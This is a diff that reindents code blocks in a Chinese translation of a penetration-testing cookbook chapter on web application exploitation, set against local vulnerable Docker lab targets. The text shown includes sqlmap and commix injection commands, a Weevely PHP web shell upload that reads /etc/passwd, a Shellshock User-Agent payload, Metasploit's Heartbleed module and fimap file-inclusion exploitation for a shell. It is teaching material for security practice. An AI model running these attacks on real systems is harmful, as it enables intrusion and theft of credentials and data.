@@ -1,4 +1,4 @@
-# 第七章。Web 应用程序利用
+# 第七章：Web 应用程序利用
 
 在本章中，我们将涵盖以下示例：
 
@@ -51,94 +51,94 @@ Burp 套件的价格并不像其他网络应用程序扫描器那样昂贵，并
 1.  打开终端并从 Docker hub 拉取 Docker 容器，如果您还没有拉取 Docker 镜像，请使用以下命令：
 
 ```
-    docker pull ishangirdhar/dvwabricks
+docker pull ishangirdhar/dvwabricks
 
-    ```
+```
 
 您应该看到以下输出：
 
 ```
-            docker pull ishangirdhar/dvwabricks
-            Using default tag: latest
-            latest: Pulling from ishangirdhar/dvwabricks
-    8387d9ff0016: Pull complete 
-    3b52deaaf0ed: Pull complete 
-    4bd501fad6de: Pull complete 
-    a3ed95caeb02: Pull complete 
-    790f0e8363b9: Pull complete 
-    11f87572ad81: Pull complete 
-    341e06373981: Pull complete 
-    709079cecfb8: Pull complete 
-    55bf9bbb788a: Pull complete 
-    b41f3cfd3d47: Pull complete 
-    70789ae370c5: Pull complete 
-    43f2fd9a6779: Pull complete 
-    6a0b3a1558bd: Pull complete 
-    934438c9af31: Pull complete 
-    1cfba20318ab: Pull complete 
-    de7f3e54c21c: Pull complete 
-    596da16c3b16: Pull complete 
-    e94007c4319f: Pull complete 
-    3c013e645156: Pull complete 
-    235b6bb50743: Pull complete 
-    85b524a6ea7a: Pull complete 
-            Digest: sha256:        ffe0a1f90c2653ca8de89d074ff39ed634dc8010d4a96a0bba14200cdf574e3
-            Status: Downloaded newer image for         ishangirdhar/dvwabricks:latest
+        docker pull ishangirdhar/dvwabricks
+        Using default tag: latest
+        latest: Pulling from ishangirdhar/dvwabricks
+8387d9ff0016: Pull complete 
+3b52deaaf0ed: Pull complete 
+4bd501fad6de: Pull complete 
+a3ed95caeb02: Pull complete 
+790f0e8363b9: Pull complete 
+11f87572ad81: Pull complete 
+341e06373981: Pull complete 
+709079cecfb8: Pull complete 
+55bf9bbb788a: Pull complete 
+b41f3cfd3d47: Pull complete 
+70789ae370c5: Pull complete 
+43f2fd9a6779: Pull complete 
+6a0b3a1558bd: Pull complete 
+934438c9af31: Pull complete 
+1cfba20318ab: Pull complete 
+de7f3e54c21c: Pull complete 
+596da16c3b16: Pull complete 
+e94007c4319f: Pull complete 
+3c013e645156: Pull complete 
+235b6bb50743: Pull complete 
+85b524a6ea7a: Pull complete 
+        Digest: sha256:        ffe0a1f90c2653ca8de89d074ff39ed634dc8010d4a96a0bba14200cdf574e3
+        Status: Downloaded newer image for         ishangirdhar/dvwabricks:latest
 
-    ```
+```
 
 1.  使用以下命令运行下载的 Docker 镜像：
 
 ```
-    docker run ishangirdhar/dvwabricks
+docker run ishangirdhar/dvwabricks
 
-    ```
+```
 
 您应该看到以下输出：
 
 ```
-            docker run ishangirdhar/dvwabricks
-            => An empty or uninitialized MySQL volume is detected in         /var/lib/mysql
-            => Installing MySQL ...
-            => Done!
-            => Waiting for confirmation of MySQL service startup
-            => Creating MySQL admin user with random password
-            => Done!        ====================================================================
-            You can now connect to this MySQL Server using:
-            mysql -uadmin -pzYKhWYtlY0xF -h<host> -P<port>
-            ======= snip===========
-            supervisord started with pid 1
-            2016-07-30 20:12:35,792 INFO spawned: 'mysqld' with pid 437
-            2016-07-30 20:12:35,794 INFO spawned: 'apache2' with pid 438
+        docker run ishangirdhar/dvwabricks
+        => An empty or uninitialized MySQL volume is detected in         /var/lib/mysql
+        => Installing MySQL ...
+        => Done!
+        => Waiting for confirmation of MySQL service startup
+        => Creating MySQL admin user with random password
+        => Done!        ====================================================================
+        You can now connect to this MySQL Server using:
+        mysql -uadmin -pzYKhWYtlY0xF -h<host> -P<port>
+        ======= snip===========
+        supervisord started with pid 1
+        2016-07-30 20:12:35,792 INFO spawned: 'mysqld' with pid 437
+        2016-07-30 20:12:35,794 INFO spawned: 'apache2' with pid 438
 
-    ```
+```
 
 1.  现在，要启动 Burp，请转到**代理**选项卡，单击**打开拦截**以关闭它，然后转到**HTTP 历史记录**选项卡，如下所示：![如何做...](img/image_07_002.jpg)![如何做...](img/image_07_003.jpg)
 
 1.  现在，一切都设置好了，我们只需要找出运行易受攻击的 Web 应用程序的容器的 IP 地址。运行以下命令：
 
 ```
-    docker ps
+docker ps
 
-    ```
+```
 
 1.  你应该会看到以下输出：![如何操作...](img/image_07_004.jpg)
 
 1.  复制容器 ID 并运行以下命令：
 
 ```
-          docker inspect dda0a7880576 | grep -i ipaddress
+      docker inspect dda0a7880576 | grep -i ipaddress
 
-    ```
+```
 
 1.  你应该会看到以下输出：
 
 ```
-          "SecondaryIPAddresses": null,
-              "IPAddress": "172.17.0.2",
-                "IPAddress": "172.17.0.2",
+      "SecondaryIPAddresses": null,
+          "IPAddress": "172.17.0.2",
+            "IPAddress": "172.17.0.2",
 
-    ```
+```
 
 1.  切换到 Firefox 窗口，在地址栏中输入前面的 IP 地址，你应该会看到下面截图中显示的内容：![如何操作...](img/image_07_005.jpg)
 
@@ -213,9 +213,9 @@ Sqlmap 是一个开源的渗透测试工具，它自动化了检测和利用 SQL
 1.  在终端上运行以下命令：
 
 ```
-    sqlmap -r "./Desktop/bricks-login-request.txt" --is-dba --tables       -users
+sqlmap -r "./Desktop/bricks-login-request.txt" --is-dba --tables       -users
 
-    ```
+```
 
 1.  `sqlmap`命令将运行其启发式检查，并显示识别的数据库为 MySQL，并询问您是否要跳过寻找其他可能的数据库；输入*Y*并按*Enter*，因为它通常是准确的，最好在服务器上生成尽可能少的请求。看一下下面的屏幕截图：![操作步骤...](img/image_07_024.jpg)
 
@@ -270,9 +270,9 @@ SQL 注入可能存在于应用程序的任何地方，例如登录页面、`GET
 1.  上述错误消息清楚地指向潜在的 SQL 注入，我们将使用 sqlmap 来利用这个 SQL 注入，使用以下命令：
 
 ```
-          sqlmap --url="http://172.17.0.2/dvwa/vulnerabilities/sqli/?id=1&       Submit=Submit#" --cookie=" security=low;         PHPSESSID=eu7s6d4urudkbq8gdlgvj4jba2"
+      sqlmap --url="http://172.17.0.2/dvwa/vulnerabilities/sqli/?id=1&       Submit=Submit#" --cookie=" security=low;         PHPSESSID=eu7s6d4urudkbq8gdlgvj4jba2"
 
-    ```
+```
 
 1.  运行上述命令后，sqlmap 立即确定后端数据库是 MySQL，并要求您确认是否可能跳过任何其他检查。按*Y*并继续，如下面的屏幕截图所示：![如何操作...](img/image_07_032.jpg)
 
@@ -283,9 +283,9 @@ SQL 注入可能存在于应用程序的任何地方，例如登录页面、`GET
 1.  在发现 ID 参数容易受到 SQL 注入的情况下，我们修改了原始命令以添加额外的开关，如下面的屏幕截图所示：
 
 ```
-          sqlmap --url="http://172.17.0.2/dvwa/vulnerabilities/sqli/?id=1&      Submit=Submit#" --cookie=" security=low;       PHPSESSID=k5c4em2sqm6j4btlm0gbs25v26" --current-db --current-user       --hostname
+      sqlmap --url="http://172.17.0.2/dvwa/vulnerabilities/sqli/?id=1&      Submit=Submit#" --cookie=" security=low;       PHPSESSID=k5c4em2sqm6j4btlm0gbs25v26" --current-db --current-user       --hostname
 
-    ```
+```
 
 1.  运行上述命令后，您可以看到以下输出：![如何操作...](img/image_07_035.jpg)
 
@@ -338,9 +338,9 @@ SQL 注入可能存在于应用程序的任何地方，例如登录页面、`GET
 1.  我们将使用以下命令启动 commix：
 
 ```
-          commix --url "http://172.17.0.2/dvwa/vulnerabilities/exec/"       --cookie='security=low; PHPSESSID=b69r7n5b2m7mj0vhps39s4db64'       --data='ip=INJECT_HERE&Submit=Submit' -all
+      commix --url "http://172.17.0.2/dvwa/vulnerabilities/exec/"       --cookie='security=low; PHPSESSID=b69r7n5b2m7mj0vhps39s4db64'       --data='ip=INJECT_HERE&Submit=Submit' -all
 
-    ```
+```
 
 1.  commix 将检测 URL 是否可达，并获取所有可能的信息，然后询问你是否要打开伪终端 Shell，如下截图所示：![如何做...](img/image_07_039.jpg)
 
@@ -383,34 +383,34 @@ SQL 注入可能存在于应用程序的任何地方，例如登录页面、`GET
 1.  现在我们需要生成一个 PHP Shell，可以使用以下命令：
 
 ```
-          Weevely generate <password-to-connect> /root/weevely.php      Weevely generate uytutu765iuhkj /root/weevely.php
+      Weevely generate <password-to-connect> /root/weevely.php      Weevely generate uytutu765iuhkj /root/weevely.php
 
-    ```
+```
 
 1.  输入`ls`，你会看到一个新文件被创建，名为`weevely.php`，因为我们的应用程序只允许上传图片，所以我们需要将这个文件重命名为`.jpg`扩展名，如下命令所示：
 
 ```
-    mv weevely.php agent.php
+mv weevely.php agent.php
 
-    ```
+```
 
 1.  用目标应用程序的文件上传模块打开目标浏览器，点击**浏览**，并从`/root`目录中选择此文件并上传，如下截图所示：![如何做...](img/image_07_045.jpg)
 
 1.  成功的消息显示了文件上传的路径。复制路径，打开终端并输入`weevely <Complete-path-to-uploaded-file> <password>`，如下命令所示：
 
 ```
-          Weevely http://172.17.0.2/dvwa/hackable/uploads/weevely.php.jpg       yoursecretpassword
+      Weevely http://172.17.0.2/dvwa/hackable/uploads/weevely.php.jpg       yoursecretpassword
 
-    ```
+```
 
 1.  Weevely 将尝试连接到上传的文件，并向你呈现它获取的有限（或受限制的）Shell，你可以在其中运行系统命令，也许可以用它来提升你的权限，如下截图所示：![如何做...](img/image_07_046.jpg)
 
 1.  Weevely 提供的另一个很好的功能是，您可以直接从单个命令中使用系统命令。为了理解这一点，请输入`weevely help`，如下面的屏幕截图所示：![操作步骤...](img/image_07_047.jpg)
 
 ```
-          Weevely http://dvwa.hackhunt.com/dvwa/hackable/uploads      /weevely.php.jpg yoursecretpass  :audit.etcpasswd
+      Weevely http://dvwa.hackhunt.com/dvwa/hackable/uploads      /weevely.php.jpg yoursecretpass  :audit.etcpasswd
 
-    ```
+```
 
 1.  运行此命令时，Weevely 将连接到后门并获取`/etc./passwd`文件，如下面的屏幕截图所示：![操作步骤...](img/image_07_048.jpg)
 
@@ -441,9 +441,9 @@ SQL 注入可能存在于应用程序的任何地方，例如登录页面、`GET
 1.  我们将从搜索并下载一个来自 Docker hub 的对 Shellshock 存在漏洞的容器开始，使用以下命令：
 
 ```
-    docker search shellshock
+docker search shellshock
 
-    ```
+```
 
 您将看到以下输出：
 
@@ -452,16 +452,16 @@ SQL 注入可能存在于应用程序的任何地方，例如登录页面、`GET
 1.  我们将使用第一个 Docker 映像进行演示，并使用以下命令来拉取 Docker 映像：
 
 ```
-          docker pull hmlio/vaas-cve-2014-6271
+      docker pull hmlio/vaas-cve-2014-6271
 
-    ```
+```
 
 1.  现在，我们将使用以下命令将 Docker 映像作为容器运行：
 
 ```
-    docker run hmlio/vaas-cve-2014-6271
+docker run hmlio/vaas-cve-2014-6271
 
-    ```
+```
 
 1.  由于它是在 Kali 中运行的第二个容器，它具有`172.17.0.3`的 IP 地址；您可以使用`docker inspect <container-name>`来查找容器的 IP 地址。现在我们将打开浏览器并访问`72.17.0.3`，您将看到以下网页：![操作步骤...](img/image_07_050.jpg)
 
@@ -472,9 +472,9 @@ SQL 注入可能存在于应用程序的任何地方，例如登录页面、`GET
 1.  转到 repeater 窗口，并将用户代理更改为以下内容：
 
 ```
-          User-Agent: () { :; }; echo; echo; /bin/bash -c 'cat       /etc/passwd;'
+      User-Agent: () { :; }; echo; echo; /bin/bash -c 'cat       /etc/passwd;'
 
-    ```
+```
 
 看一下下面的屏幕截图：
 
@@ -511,9 +511,9 @@ SQL 注入可能存在于应用程序的任何地方，例如登录页面、`GET
 1.  我们将通过以下命令搜索并下载一个来自 Docker hub 的易受 Shellshock 漏洞影响的容器来开始这个配方：
 
 ```
-          docker search heartbleed
+      docker search heartbleed
 
-    ```
+```
 
 您将看到以下输出：
 
@@ -522,16 +522,16 @@ SQL 注入可能存在于应用程序的任何地方，例如登录页面、`GET
 1.  我们将使用第一个 Docker 镜像进行演示，并使用以下命令来拉取 Docker 镜像：
 
 ```
-          docker pull andrewmichaelsmith/docker-heartbleed
+      docker pull andrewmichaelsmith/docker-heartbleed
 
-    ```
+```
 
 1.  现在，我们将使用以下命令将 Docker 镜像作为容器运行：
 
 ```
-          docker run andrewmichaelsmith/docker-heartbleed
+      docker run andrewmichaelsmith/docker-heartbleed
 
-    ```
+```
 
 1.  由于它是我们 Kali 中运行的第三个容器，它具有`172.17.0.4`的 IP 地址。您可以使用`docker inspect <container-name>`来查找您的容器的 IP 地址。我们现在将打开浏览器并访问`72.17.0.4`。您将看到以下网页：![操作步骤...](img/image_07_056.jpg)
 
@@ -542,20 +542,20 @@ SQL 注入可能存在于应用程序的任何地方，例如登录页面、`GET
 1.  正如我们所看到的，有一个可用于 Heartbleed 的辅助模块。我们将继续并使用以下命令进行利用：
 
 ```
-          msf > use auxiliary/scanner/ssl/openssl_heartbleed      msf auxiliary(openssl_heartbleed) >
+      msf > use auxiliary/scanner/ssl/openssl_heartbleed      msf auxiliary(openssl_heartbleed) >
 
-    ```
+```
 
 1.  输入`show options`来查看可用选项，如下所示：![操作步骤...](img/image_07_059.jpg)
 
 1.  您需要根据目标信息更改`rhost`和`rhost`；在我们的情况下，如下所示：
 
 ```
-          msf > set rhosts 172.17.0.4
-          msf > set rport 443
-          msf > set action SCAN
+      msf > set rhosts 172.17.0.4
+      msf > set rport 443
+      msf > set action SCAN
 
-    ```
+```
 
 1.  设置适当的设置后，我们将在`msf`控制台上输入`run`来运行模块，输出如下：![操作步骤...](img/image_07_060.jpg)
 
@@ -602,9 +602,9 @@ Fimap 是一个 Python 工具，可以帮助自动查找、准备、审计和最
 1.  要使用 Fimap 来利用 LFI/RFI 漏洞，我们需要使用以下命令：
 
 ```
-          fimap -u 'http://172.17.0.2/dvwa/vulnerabilities       /fi/?page=include.php' --cookie="security=low;         PHPSESSID=b2qfpad4jelu36n6d2o5p6snl7" --enable-blind
+      fimap -u 'http://172.17.0.2/dvwa/vulnerabilities       /fi/?page=include.php' --cookie="security=low;         PHPSESSID=b2qfpad4jelu36n6d2o5p6snl7" --enable-blind
 
-    ```
+```
 
 1.  Fimap 将开始查找服务器上可以读取的本地文件，并在目标易受文件包含攻击时显示它，如下面的屏幕截图所示：![操作步骤...](img/image_07_067.jpg)
 
@@ -613,9 +613,9 @@ Fimap 是一个 Python 工具，可以帮助自动查找、准备、审计和最
 1.  现在，我们将使用之前使用的带有`-x`结尾的命令，以便继续利用此文件包含并获取服务器的 shell，如下所示：
 
 ```
-          fimap -u http://dvwa.hackhunt.com/dvwa/vulnerabilities      /fi/?page=include.php        --cookie="PHPSESSID=376221ac6063449b0580c289399d89bc;      security=low" -x
+      fimap -u http://dvwa.hackhunt.com/dvwa/vulnerabilities      /fi/?page=include.php        --cookie="PHPSESSID=376221ac6063449b0580c289399d89bc;      security=low" -x
 
-    ```
+```
 
 1.  Fimap 将启动交互式菜单并要求输入；选择`1`，因为我们的域是`dvwa.hackhunt.com`，如下所示：![操作步骤...](img/image_07_069.jpg)
 
